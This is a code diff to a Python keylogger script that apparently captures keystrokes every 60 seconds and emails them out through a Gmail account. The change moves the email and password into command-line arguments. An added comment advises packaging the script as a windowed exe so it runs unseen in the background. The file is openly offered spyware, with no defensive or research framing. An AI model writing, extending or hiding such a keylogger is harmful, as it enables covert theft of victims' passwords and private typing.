@@ -19,10 +19,17 @@ from threading import Semaphore, Timer
 # before running the script set "ACCESS TO LESS SECURE APPS" to YES in google account
 # 60 seconds
 TIME_INTERVAL = 60
-# enter you email inside "HERE"
-EMAIL = ""
-# and you email's password inside "HERE"
-PASSWORD = ""
+try:
+    # sys.argv[1] will take email as first CLA
+    # or we can replace sys.argv[1] with "email"
+    EMAIL = sys.argv[1]
+    # sys.argv[2] will take password as first CLA
+    # or we can replace sys.argv[2] with "password"
+    PASSWORD = sys.argv[2]
+except:
+    print("Usage :\npython3 keylogger.py \"email\" \"password\"")
+    sys.exit(1)
+
 
 if len(EMAIL) <= 0 or len(PASSWORD) <= 0:
     print("Enter email and password first...")
@@ -84,3 +91,7 @@ class Keylogger:
 
 Keylogger = Keylogger(interval=TIME_INTERVAL)
 Keylogger.start()
+
+# convert to window based exe with auto-py-to-exe
+# and pass email and password as command line argument
+# to exe file, so that it can run in background
